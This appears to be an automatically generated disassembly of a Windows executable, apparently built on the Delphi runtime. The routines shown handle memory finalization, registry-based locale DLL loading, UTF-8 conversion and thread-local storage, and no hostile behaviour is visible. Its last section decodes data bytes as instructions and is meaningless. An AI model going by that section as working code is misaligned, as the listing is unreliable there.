pop ebp
pop edi
pop esi
pop ebx
retn 0x4
jmp r-xdata
mov eax ebx
mov edx esi
call sub_404a20
add ebx 0x10
add esi 0x10
dec ebp
jne r-xdata
cmp cl 0xd
je r-xdata
jmp r-xdata
xor ecx ecx
mov cl [ edi + 0x1 ]
lea edi [ ecx + edi + 0x2 ]
cmp cl 0xe
je r-xdata
mov eax ebx
mov edx esi
mov ecx [ edi + 0x8 ]
push [ edi + 0x4 ]
call sub_404b54
add ebx [ edi ]
add esi [ edi ]
dec ebp
jne r-xdata
jmp r-xdata
mov eax ebx
mov edx esi
mov ecx edi
call sub_404a38
xor eax eax
mov al [ edi + 0x1 ]
add ebx [ eax + edi + 0x2 ]
add esi [ eax + edi + 0x2 ]
dec ebp
jne r-xdata
cmp cl 0xf
je r-xdata
jmp r-xdata
mov eax ebx
mov edx [ esi ]
call sub_405500
add ebx 0x4
add esi 0x4
dec ebp
jne r-xdata
cmp cl 0x11
je r-xdata
jmp r-xdata
mov eax ebx
mov edx [ esi ]
mov ecx edi
call sub_404e78
add ebx 0x4
add esi 0x4
dec ebp
jne r-xdata
mov al 0x2
pop ebp
pop edi
pop esi
pop ebx
jmp sub_402828
sub_404c50
push edx
push eax
mov eax [ esp + 0x10 ]
mul [ esp ]
mov ecx eax
mov eax [ esp + 0x4 ]
mul [ esp + 0xc ]
add ecx eax
mov eax [ esp ]
mul [ esp + 0xc ]
add edx ecx
pop ecx
pop ecx
retn 0x8
sub_404ca4
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
push esi
push edi
mov [ ebp - 0x8 ] ecx
mov esi edx
mov [ ebp - 0x4 ] eax
mov ebx [ ebp - 0x4 ]
mov ebx [ ebx ]
mov eax [ ebp + 0x8 ]
mov edi [ eax ]
test edi edi
jg r-xdata
xor eax eax
mov [ ebp - 0x10 ] eax
test ebx ebx
je r-xdata
test edi edi
jge r-xdata
xor eax eax
mov al [ esi + 0x1 ]
add esi eax
mov eax esi
mov edx [ eax + 0x2 ]
mov [ ebp - 0x18 ] edx
mov edx [ eax + 0x6 ]
test edx edx
je r-xdata
sub ebx 0x4
mov eax [ ebx ]
mov [ ebp - 0x10 ] eax
sub ebx 0x4
mov eax [ ebp - 0x4 ]
mov edx esi
call sub_404c9c
jmp r-xdata
mov al 0x4
call sub_402828
xor esi esi
mov esi [ edx ]
jmp r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
add [ ebp - 0x1c ] 0x8
test ebx ebx
je r-xdata
mov al 0x4
call sub_402828
mov eax edi
imul [ ebp - 0x18 ]
mov [ ebp - 0x1c ] eax
mov eax [ ebp - 0x1c ]
cdq
idiv edi
cmp eax [ ebp - 0x18 ]
je r-xdata
mov [ ebp - 0x20 ] ebx
cmp edi [ ebp - 0x10 ]
jge r-xdata
cmp [ ebx ] 0x1
jne r-xdata
lea eax [ ebp - 0x20 ]
mov edx [ ebp - 0x1c ]
call sub_40270c
mov ebx [ ebp - 0x20 ]
jmp r-xdata
test esi esi
je r-xdata
dec [ ebx ]
mov eax [ ebp - 0x1c ]
call sub_4026cc
mov ebx eax
mov eax [ ebp - 0x10 ]
mov [ ebp - 0x14 ] eax
cmp edi [ ebp - 0x14 ]
jge r-xdata
mov [ ebx ] 0x1
add ebx 0x4
mov [ ebx ] edi
add ebx 0x4
mov edx edi
sub edx [ ebp - 0x10 ]
imul edx [ ebp - 0x18 ]
mov eax [ ebp - 0x18 ]
imul eax [ ebp - 0x10 ]
add eax ebx
xor ecx ecx
call sub_402b04
cmp [ ebp - 0x8 ] 0x1
jle r-xdata
mov eax ebx
add eax 0x8
mov edx edi
imul edx [ ebp - 0x18 ]
add eax edx
mov ecx [ ebp - 0x10 ]
sub ecx edi
mov edx esi
call j_sub_404928
test esi esi
je r-xdata
mov [ ebp - 0x14 ] edi
mov eax [ ebp - 0x4 ]
mov [ eax ] ebx
add [ ebp + 0x8 ] 0x4
dec [ ebp - 0x8 ]
dec edi
test edi edi
jl r-xdata
mov ecx [ ebp - 0x14 ]
imul ecx [ ebp - 0x18 ]
mov edx ebx
add edx 0x8
mov eax [ ebp - 0x4 ]
mov eax [ eax ]
call sub_4028c8
mov edx [ ebp - 0x14 ]
imul edx [ ebp - 0x18 ]
mov eax ebx
add eax 0x8
xor ecx ecx
call sub_402b04
mov eax [ ebp - 0x14 ]
push eax
mov edx [ ebp - 0x4 ]
mov edx [ edx ]
mov eax ebx
add eax 0x8
mov ecx esi
call sub_404c84
jmp r-xdata
inc edi
mov [ ebp - 0xc ] 0x0
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp - 0xc ]
lea eax [ ebx + eax * 4 ]
mov ecx [ ebp - 0x8 ]
mov edx esi
call sub_404ca4
inc [ ebp - 0xc ]
dec edi
jne r-xdata
sub_404e3c
mov ecx [ eax ]
test ecx ecx
je r-xdata
retn
mov [ eax ] 0x0
[ ecx - 0x8 ]
jne r-xdata
push eax
mov eax ecx
xor ecx ecx
mov cl [ edx + 0x1 ]
mov edx [ ecx + edx + 0x6 ]
test edx edx
je r-xdata
sub eax 0x8
call sub_4026ec
pop eax
mov ecx [ eax - 0x4 ]
test ecx ecx
je r-xdata
mov edx [ edx ]
call sub_404928
sub_404e78
push ebx
mov ebx [ eax ]
test edx edx
je r-xdata
test ebx ebx
je r-xdata
[ edx - 0x8 ]
mov [ eax ] edx
pop ebx
retn
[ ebx - 0x8 ]
jne r-xdata
push eax
push edx
mov edx ecx
inc [ ebx - 0x8 ]
call sub_404e3c
pop edx
pop eax
sub_404ea0
add esp 0xffffffe4
push 0x1c
lea edx [ esp + 0x4 ]
push edx
push eax
call sub_4012dc
cmp [ esp + 0x10 ] 0x1000
jne r-xdata
xor eax eax
mov eax [ esp + 0x4 ]
jmp r-xdata
add esp 0x1c
retn
sub_404ed0
push ebx
push esi
add esp 0xfffffef8
mov ebx eax
cmp [ ebx + 0x10 ] 0x0
jne r-xdata
mov eax [ ebx + 0x10 ]
add esp 0x108
pop esi
pop ebx
retn
push 0x105
lea eax [ esp + 0x4 ]
push eax
mov eax [ ebx + 0x4 ]
push eax
call sub_40126c
mov eax esp
mov dl 0x1
call sub_40510c
mov esi eax
mov [ ebx + 0x10 ] esi
test esi esi
jne r-xdata
mov eax [ ebx + 0x4 ]
mov [ ebx + 0x10 ] eax
sub_404f18
mov edx [ rw-data ]
test edx edx
je r-xdata
retn
cmp eax [ edx + 0x4 ]
je r-xdata
mov eax edx
call sub_404ed0
retn
cmp eax [ edx + 0x8 ]
je r-xdata
cmp eax [ edx + 0xc ]
jne r-xdata
mov edx [ edx ]
test edx edx
jne r-xdata
sub_404f54
push ebp
mov ebp esp
add esp 0xfffffdb0
push ebx
push esi
push edi
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov [ ebp - 0xc ] eax
push r-xdata
call sub_401274
mov esi eax
test esi esi
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax ] 0x5c
jne r-xdata
push r-xdata
push esi
call sub_40127c
mov ebx eax
test ebx ebx
je r-xdata
mov esi [ ebp - 0x4 ]
add esi 0x2
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x1 ] 0x5c
jne r-xdata
push 0x105
lea eax [ ebp - 0x24f ]
push eax
mov eax [ ebp - 0x4 ]
push eax
call ebx
test eax eax
je r-xdata
cmp [ esi ] 0x0
jne r-xdata
mov eax [ ebp - 0xc ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x4 ]
add eax 0x2
call sub_404f40
mov esi eax
cmp [ esi ] 0x0
je r-xdata
mov eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0x24f ]
push eax
mov eax [ ebp - 0x4 ]
push eax
call lstrcpynA
jmp r-xdata
lea eax [ esi + 0x1 ]
call sub_404f40
mov edi eax
mov eax edi
sub eax esi
mov edx eax
add edx ebx
inc edx
cmp edx 0x105
jg r-xdata
mov eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0x24f ]
push eax
mov eax [ ebp - 0x4 ]
push eax
call lstrcpynA
lea eax [ esi + 0x1 ]
call sub_404f40
mov esi eax
cmp [ esi ] 0x0
je r-xdata
inc eax
push eax
push esi
lea eax [ ebp - 0x24f ]
add eax ebx
push eax
call lstrcpynA
lea eax [ ebp - 0x14a ]
push eax
lea eax [ ebp - 0x24f ]
push eax
call FindFirstFileA
mov esi eax
cmp esi 0xffffffff
je r-xdata
jmp r-xdata
push esi
call FindClose
lea eax [ ebp - 0x11e ]
push eax
call lstrlenA
lea edx [ ebx + 0x1 ]
add eax edx
inc eax
cmp eax 0x105
jg r-xdata
mov ebx esi
sub ebx [ ebp - 0x4 ]
lea eax [ ebx + 0x1 ]
push eax
mov eax [ ebp - 0x4 ]
push eax
lea eax [ ebp - 0x24f ]
push eax
call lstrcpynA
jmp r-xdata
mov [ ebp + ebx - 0x24f ] 0x5c
mov eax 0x105
sub eax ebx
dec eax
push eax
lea eax [ ebp - 0x11e ]
push eax
lea eax [ ebp - 0x24f ]
add eax ebx
inc eax
push eax
call lstrcpynA
lea eax [ ebp - 0x11e ]
push eax
call lstrlenA
inc eax
add ebx eax
mov esi edi
sub_40510c
push ebp
mov ebp esp
add esp 0xfffffee0
push ebx
push esi
mov [ ebp - 0x4 ] eax
push 0x105
lea eax [ ebp - 0x11d ]
push eax
push 0x0
call sub_40126c
mov [ ebp - 0x12 ] 0x0
lea eax [ ebp - 0x8 ]
push eax
push 0xf0019
push 0x0
push r-xdata
push 0x80000001
call sub_4012c4
test eax eax
je r-xdata
xor eax eax
push ebp
push sub_405211
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0x18 ] 0x5
lea eax [ ebp - 0x11d ]
mov edx 0x105
call sub_404f54
lea eax [ ebp - 0x18 ]
push eax
lea eax [ ebp - 0x12 ]
push eax
push 0x0
push 0x0
lea eax [ ebp - 0x11d ]
push eax
mov eax [ ebp - 0x8 ]
push eax
call sub_4012cc
test eax eax
je r-xdata
lea eax [ ebp - 0x8 ]
push eax
push 0xf0019
push 0x0
push r-xdata
push 0x80000002
call sub_4012c4
test eax eax
je r-xdata
mov [ ebp - 0xe ] 0x0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x8 ]
push eax
call sub_4012bc
retn
lea eax [ ebp - 0x18 ]
push eax
lea eax [ ebp - 0x12 ]
push eax
push 0x0
push 0x0
push r-xdata
mov eax [ ebp - 0x8 ]
push eax
call sub_4012cc
test eax eax
je r-xdata
lea eax [ ebp - 0x8 ]
push eax
push 0xf0019
push 0x0
push r-xdata
push 0x80000001
call sub_4012c4
test eax eax
jne r-xdata
mov [ ebp - 0x12 ] 0x0
push 0x105
mov eax [ ebp - 0x4 ]
push eax
lea eax [ ebp - 0x11d ]
push eax
call lstrcpynA
push 0x5
lea eax [ ebp - 0xd ]
push eax
push 0x3
call sub_40128c
push eax
call sub_401264
xor esi esi
cmp [ ebp - 0x11d ] 0x0
je r-xdata
mov eax esi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
cmp [ ebp - 0xd ] 0x0
jne r-xdata
lea eax [ ebp - 0x11d ]
push eax
call lstrlenA
mov ebx eax
lea eax [ ebp - 0x11d ]
add ebx eax
jmp r-xdata
cmp [ ebp - 0x12 ] 0x0
je r-xdata
cmp [ ebx ] 0x2e
je r-xdata
lea eax [ ebp - 0x11d ]
cmp ebx eax
je r-xdata
lea eax [ ebp - 0x11d ]
cmp ebx eax
jne r-xdata
inc ebx
cmp [ ebp - 0x12 ] 0x0
je r-xdata
dec ebx
test esi esi
jne r-xdata
mov edx ebx
sub edx eax
mov eax 0x105
sub eax edx
push eax
lea eax [ ebp - 0x12 ]
push eax
push ebx
call lstrcpynA
push 0x2
push 0x0
lea eax [ ebp - 0x11d ]
push eax
call LoadLibraryExA
mov esi eax
cmp [ ebp - 0xd ] 0x0
je r-xdata
lea eax [ ebp - 0x11d ]
mov edx ebx
sub edx eax
mov eax 0x105
sub eax edx
push eax
lea eax [ ebp - 0xd ]
push eax
push ebx
call lstrcpynA
push 0x2
push 0x0
lea eax [ ebp - 0x11d ]
push eax
call LoadLibraryExA
mov esi eax
test esi esi
jne r-xdata
mov [ ebp - 0xb ] 0x0
lea eax [ ebp - 0x11d ]
mov edx ebx
sub edx eax
mov eax 0x105
sub eax edx
push eax
lea eax [ ebp - 0xd ]
push eax
push ebx
call lstrcpynA
push 0x2
push 0x0
lea eax [ ebp - 0x11d ]
push eax
call LoadLibraryExA
mov esi eax
sub_4053ac
push ebx
push esi
mov esi [ rw-data ]
test esi esi
je r-xdata
mov edx esi
test edx edx
je r-xdata
mov edx [ esi + 0x4 ]
cmp edx eax
jne r-xdata
pop esi
pop ebx
retn
mov ecx [ edx ]
test ecx ecx
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
mov [ rw-data ] eax
mov edx 0x8
mov eax esi
call sub_4026ec
pop esi
pop ebx
retn
mov edx [ edx ]
test edx edx
jne r-xdata
mov ebx [ ecx + 0x4 ]
cmp ebx eax
jne r-xdata
mov esi ecx
mov eax [ ecx ]
mov [ edx ] eax
mov edx 0x8
mov eax esi
call sub_4026ec
jmp r-xdata
sub_40540c
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov eax [ rw-data ]
mov [ ebp - 0x8 ] eax
cmp [ ebp - 0x8 ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
xor eax eax
push ebp
push sub_405447
push [ fs : eax ]
mov [ fs : eax ] esp
mov ebx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call [ ebx + 0x4 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax ]
mov [ ebp - 0x8 ] eax
cmp [ ebp - 0x8 ] 0x0
jne r-xdata
sub_405478
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] eax
xor edx edx
push ebp
push sub_4054dc
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
call sub_40540c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4054e3
mov eax [ ebp - 0x4 ]
cmp eax [ rw-data ]
jne r-xdata
mov eax [ rw-data ]
test eax eax
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax ]
mov [ rw-data ] eax
jmp r-xdata
retn
mov edx [ eax ]
cmp edx [ ebp - 0x4 ]
jne r-xdata
mov eax [ eax ]
test eax eax
jne r-xdata
mov edx [ ebp - 0x4 ]
mov edx [ edx ]
mov [ eax ] edx
jmp r-xdata
sub_405500
test edx edx
je r-xdata
mov ecx [ eax ]
test ecx ecx
mov [ eax ] edx
je r-xdata
push edx
push eax
mov eax [ edx ]
push edx
call [ eax + 0x4 ]
pop eax
mov ecx [ eax ]
pop [ eax ]
test ecx ecx
jne r-xdata
retn
mov eax [ ecx ]
push ecx
call [ eax + 0x8 ]
mov eax [ ecx ]
push ecx
call [ eax + 0x8 ]
retn
retn
sub_40552c
test edx edx
je sub_4054e8
push edi
mov edi eax
push 0x0
push esp
push ecx
push edx
mov eax [ edx ]
call [ eax ]
test eax eax
je r-xdata
mov eax [ edi ]
test eax eax
je r-xdata
mov al 0x17
jmp sub_402828
pop eax
mov [ edi ] eax
pop edi
retn
push eax
mov eax [ eax ]
call [ eax + 0x8 ]
sub_4055d0
push ebp
mov ebp esp
push ebx
push esi
mov ebx [ ebp + 0x8 ]
lea eax [ ebx + 0x4 ]
push eax
call sub_401304
mov esi eax
test esi esi
jne r-xdata
mov eax esi
pop esi
pop ebx
pop ebp
retn 0x4
mov dl 0x1
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x4 ]
sub_4055f8
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
xor edx edx
cmp [ ebp - 0x8 ] 0x0
je r-xdata
mov eax edx
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x4
xor esi esi
xor ecx ecx
test eax eax
je r-xdata
cmp ecx [ ebp + 0x8 ]
jae r-xdata
jmp r-xdata
lea edx [ esi + 0x1 ]
mov eax [ ebp - 0x8 ]
movzx edx [ eax + ecx * 2 ]
inc ecx
cmp edx 0x7f
jbe r-xdata
cmp ecx [ ebp + 0x8 ]
jae r-xdata
inc esi
cmp ecx [ ebp + 0x8 ]
jb r-xdata
cmp edx 0x7ff
jbe r-xdata
cmp esi [ ebp - 0x4 ]
jb r-xdata
cmp esi [ ebp - 0x4 ]
jb r-xdata
inc esi
inc esi
mov [ eax + esi ] 0x0
jmp r-xdata
mov esi [ ebp - 0x4 ]
dec esi
mov edx [ ebp - 0x8 ]
movzx edx [ edx + ecx * 2 ]
inc ecx
cmp edx 0x7f
ja r-xdata
cmp edx 0x7ff
jbe r-xdata
mov [ eax + esi ] dl
inc esi
jmp r-xdata
lea ebx [ esi + 0x2 ]
cmp ebx [ ebp - 0x4 ]
ja r-xdata
lea ebx [ esi + 0x3 ]
cmp ebx [ ebp - 0x4 ]
ja r-xdata
mov ebx edx
shr ebx 0x6
or bl 0xc0
mov [ eax + esi ] bl
and dl 0x3f
or dl 0x80
mov [ eax + esi + 0x1 ] dl
add esi 0x2
mov ebx edx
shr ebx 0xc
or bl 0xe0
mov [ eax + esi ] bl
mov ebx edx
shr ebx 0x6
and bl 0x3f
or bl 0x80
mov [ eax + esi + 0x1 ] bl
and dl 0x3f
or dl 0x80
mov [ eax + esi + 0x2 ] dl
add esi 0x3
jmp r-xdata
sub_4056d4
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
cmp [ ebp - 0xc ] 0x0
jne r-xdata
mov [ ebp - 0x10 ] 0xffffffff
xor eax eax
xor esi esi
cmp [ ebp - 0x4 ] 0x0
je r-xdata
xor eax eax
mov [ ebp - 0x10 ] eax
jmp r-xdata
cmp esi [ ebp + 0x8 ]
jae r-xdata
jmp r-xdata
mov eax [ ebp - 0x10 ]
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
inc eax
mov [ ebp - 0x10 ] eax
mov edx [ ebp - 0xc ]
mov dl [ edx + esi ]
inc esi
test dl 0x80
je r-xdata
cmp esi [ ebp + 0x8 ]
jae r-xdata
inc eax
cmp esi [ ebp + 0x8 ]
jb r-xdata
cmp esi [ ebp + 0x8 ]
jae r-xdata
cmp eax [ ebp - 0x8 ]
jb r-xdata
cmp eax [ ebp - 0x8 ]
jb r-xdata
and dl 0x3f
test dl 0x20
je r-xdata
mov edx [ ebp - 0x4 ]
mov [ edx + eax * 2 ] 0x0
jmp r-xdata
mov eax [ ebp - 0x8 ]
dec eax
mov edx [ ebp - 0xc ]
xor ecx ecx
mov cl [ edx + esi ]
inc esi
test cl 0x80
je r-xdata
mov edx [ ebp - 0xc ]
mov dl [ edx + esi ]
inc esi
and dl 0xc0
cmp dl 0x80
jne r-xdata
mov edx [ ebp - 0xc ]
mov dl [ edx + esi ]
inc esi
and dl 0xc0
cmp dl 0x80
jne r-xdata
mov edx [ ebp - 0x4 ]
mov [ edx + eax * 2 ] cx
cmp esi [ ebp + 0x8 ]
jae r-xdata
cmp esi [ ebp + 0x8 ]
jae r-xdata
and ecx 0x3f
test cl 0x20
je r-xdata
mov edx [ ebp - 0xc ]
mov dl [ edx + esi ]
inc esi
mov ebx edx
and bl 0xc0
cmp bl 0x80
jne r-xdata
mov edx [ ebp - 0xc ]
mov dl [ edx + esi ]
inc esi
mov ebx edx
and bl 0xc0
cmp bl 0x80
jne r-xdata
and dl 0x3f
and edx 0xff
shl ecx 0x6
or dx cx
mov ecx [ ebp - 0x4 ]
mov [ ecx + eax * 2 ] dx
jmp r-xdata
cmp esi [ ebp + 0x8 ]
jae r-xdata
inc eax
and dl 0x3f
and edx 0xff
shl ecx 0x6
or edx ecx
mov ecx edx
sub_40580c
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_4058ab
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax esi
call sub_403eac
mov eax ebx
xor edx edx
call sub_404704
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4058b2
lea eax [ ebp - 0x4 ]
call sub_403eac
retn
mov eax ebx
call sub_4046f8
lea edx [ eax + eax * 2 ]
lea eax [ ebp - 0x4 ]
call sub_4044f8
mov eax ebx
call sub_4046f8
push eax
mov eax [ ebp - 0x4 ]
call sub_40416c
inc eax
push eax
mov eax ebx
call sub_4046e8
push eax
mov eax [ ebp - 0x4 ]
call sub_40436c
pop ecx
pop edx
call sub_4055f8
test eax eax
jle r-xdata
lea eax [ ebp - 0x4 ]
call sub_403eac
mov edx eax
dec edx
lea eax [ ebp - 0x4 ]
call sub_4044f8
jmp r-xdata
mov eax esi
mov edx [ ebp - 0x4 ]
call sub_403f00
sub_4058b8
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_40594f
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax esi
call sub_40458c
test ebx ebx
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_405956
lea eax [ ebp - 0x4 ]
call sub_40458c
retn
mov eax ebx
call sub_40416c
mov edx eax
lea eax [ ebp - 0x4 ]
call sub_4047d4
mov eax ebx
call sub_40416c
push eax
mov eax [ ebp - 0x4 ]
call sub_4046f8
inc eax
push eax
mov eax ebx
call sub_40436c
push eax
mov eax [ ebp - 0x4 ]
call sub_4046e8
pop ecx
pop edx
call sub_4056d4
test eax eax
jle r-xdata
lea eax [ ebp - 0x4 ]
call sub_40458c
mov edx eax
dec edx
lea eax [ ebp - 0x4 ]
call sub_4047d4
jmp r-xdata
mov eax esi
mov edx [ ebp - 0x4 ]
call sub_4045c8
sub_40595c
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_40599f
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
mov edx ebx
call sub_4046d8
mov eax [ ebp - 0x4 ]
mov edx esi
call sub_40580c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4059a6
lea eax [ ebp - 0x4 ]
call sub_40458c
retn
sub_4059ac
push ebx
push esi
add esp 0xfffffc00
mov esi edx
mov ebx eax
test ebx ebx
je r-xdata
add esp 0x400
pop esi
pop ebx
retn
cmp [ ebx + 0x4 ] 0x10000
jge r-xdata
mov eax esi
mov edx [ ebx + 0x4 ]
call sub_4040a4
push 0x400
lea eax [ esp + 0x4 ]
push eax
mov eax [ ebx + 0x4 ]
push eax
mov eax [ ebx ]
mov eax [ eax ]
call sub_404f18
push eax
call sub_40129c
mov ecx eax
mov edx esp
mov eax esi
call sub_403f9c
jmp r-xdata
sub_405a04
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
xor edx edx
mov [ ebp - 0x10 ] edx
xor edx edx
push ebp
push sub_405a6a
push [ fs : edx ]
mov [ fs : edx ] esp
push 0x7
lea edx [ ebp - 0xb ]
push edx
push 0x1004
push eax
call sub_401264
lea eax [ ebp - 0x10 ]
lea edx [ ebp - 0xb ]
mov ecx 0x7
call sub_40411c
mov eax [ ebp - 0x10 ]
lea edx [ ebp - 0x4 ]
call sub_402b24
mov ebx eax
cmp [ ebp - 0x4 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_405a71
lea eax [ ebp - 0x10 ]
call sub_403eac
retn
xor ebx ebx
sub_405a78
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_405ac2
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_405ac9
retn
mov eax rw-data
call sub_40299c
mov eax rw-data
call sub_40299c
mov eax rw-data
call sub_40299c
call sub_401ad0
sub_405acc
sub [ rw-data ] 0x1
jae r-xdata
retn
mov [ rw-data ] 0x2
mov [ rw-data ] r-xdata
mov [ rw-data ] r-xdata
mov [ rw-data ] 0x2
mov [ rw-data ] sub_404c48
call sub_402f30
test al al
je r-xdata
call sub_403024
mov [ rw-data ] 0xd7b0
mov [ rw-data ] 0xd7b0
mov [ rw-data ] 0xd7b0
call GetCommandLineA
mov [ rw-data ] eax
call sub_40131c
mov [ rw-data ] eax
call sub_401314
and eax 0x80000000
cmp eax 0x80000000
je r-xdata
call sub_402f60
call sub_40128c
call sub_405a04
mov [ rw-data ] eax
call sub_401314
and eax 0xff
cmp ax 0x4
jbe r-xdata
call sub_40128c
call sub_405a04
mov [ rw-data ] eax
jmp r-xdata
mov [ rw-data ] 0x3
jmp r-xdata
call sub_40130c
mov [ rw-data ] eax
sub_405bd4
push ebx
call sub_405bcc
mov ebx eax
test ebx ebx
je r-xdata
pop ebx
retn
cmp [ rw-data ] 0xffffffff
jne r-xdata
mov eax ebx
call sub_405bc0
test eax eax
jne r-xdata
mov eax 0xe2
call sub_403e1c
push eax
mov eax [ rw-data ]
push eax
call TlsSetValue
mov eax 0xe2
call sub_403e1c
sub_405c18
mov cl [ rw-data ]
mov eax [ rw-data ]
test cl cl
jne r-xdata
push eax
call TlsGetValue
test eax eax
je r-xdata
mov edx [ fs : 0x2c ]
mov eax [ edx + eax * 4 ]
retn
call sub_405bd4
mov eax [ rw-data ]
push eax
call TlsGetValue
test eax eax
je r-xdata
retn
mov eax [ rw-data ]
retn
retn
sub_405c64
push ebx
mov ebx eax
xor eax eax
mov [ rw-data ] eax
push 0x0
call sub_405ba0
mov [ rw-data ] eax
mov eax [ rw-data ]
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
call sub_405c58
mov edx rw-data
mov eax ebx
call sub_403b70
pop ebx
retn
sub_405ca8
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_405ccd
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_405cd4
retn
sub_405d04
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
mov [ ebx ] eax
mov [ ebx + 0x4 ] edx
add ecx eax
mov [ ebx + 0x8 ] ecx
add edx [ ebp + 0xc ]
mov [ ebx + 0xc ] edx
pop ebx
pop ebp
retn 0x8
sub_405d20
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_405d45
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_405d4c
retn
sub_405d58
pop esp
pop ebp
inc eax
add [ ebx ] al
add ch [ esi ]
xor [ 0x0 ] eax
or al 0x0
add [ eax ] al
pop eax
pop ebp
inc eax
add [ edx ] cl
outsd
push ebx
insb
arpl [ gs : ebp + 0x64 ] si
or [ edi + 0x64 ] ch
inc edi
jb r-xdata
jb r-xdata
jns r-xdata
xchg ebx eax
inc esi
xor [ fs : ebx ] ecx
outsd
push edx
jae r-xdata
or ch [ fs : edi + 0x64 ]
inc esp
imul esi [ ebx + 0x61 ] 0x64656c62
or [ edi + 0x64 ] ebp
inc ebx
push 0x656b6365
or [ fs : edi + 0x64 ] ebp
inc esi
outsd
arpl [ ebp + 0x73 ] si
or [ fs : edi + 0x64 ] ebp
inc esp
popa
jne r-xdata
inc esi
add [ ebx + 0x2025ffc0 ] cl
jb r-xdata
jb r-xdata
je r-xdata
sar bh 0x25
sbb [ ebx - 0x3f74ffba ] dl
jmp [ __import_lookup_table_6(kernel32:EnterCriticalSection) ]
xor cl [ fs : esi ]
outsd
inc ebx
outsd
insd
bound ebp [ edi + 0x42 ]
outsd
js r-xdata
inc esi
add [ ebx + 0xc25ffc0 ] cl
xchg ebx eax
inc esi
add [ ebx + 0x825ffc0 ] cl
xchg ebx eax
inc esi
add [ ebx + 0x425ffc0 ] cl
xchg ebx eax
inc esi
add [ ebx + 0x25ffc0 ] cl
xchg ebx eax
inc esi
add [ ebx - 0x3da0040 ] cl
xchg edx eax
inc esi
add [ ebx - 0x7da0040 ] cl
xchg edx eax
inc esi
add [ ebx - 0xbda0040 ] cl
xchg edx eax
inc esi
add [ ebx - 0xfda0040 ] cl
xchg edx eax
inc esi
add [ ebx - 0x13da0040 ] cl
xchg edx eax
inc esi
add [ ebx - 0x17da0040 ] cl
xchg edx eax
inc esi
add [ ebx - 0x1bda0040 ] cl
xchg edx eax
inc esi
add [ ebx - 0x1fda0040 ] cl
xchg edx eax
inc esi
add [ ebx - 0x23da0040 ] cl
xchg edx eax
inc esi
add [ ebx - 0x27da0040 ] cl
xchg edx eax
inc esi
add [ ebx - 0x2bda0040 ] cl
xchg edx eax
inc esi
add [ ebx - 0x2fda0040 ] cl
xchg edx eax
inc esi
add [ ebx - 0x33da0040 ] cl
xchg edx eax
inc esi
add [ ebx - 0x37da0040 ] cl
xchg edx eax
inc esi
add [ ebx - 0x3bda0040 ] cl
xchg edx eax
inc esi
add [ ebx - 0x3fda0040 ] cl
xchg edx eax
inc esi
add [ ebx - 0x43da0040 ] cl
xchg edx eax
inc esi
add [ ebx - 0x47da0040 ] cl
xchg edx eax
inc esi
add [ ebx - 0x4bda0040 ] cl
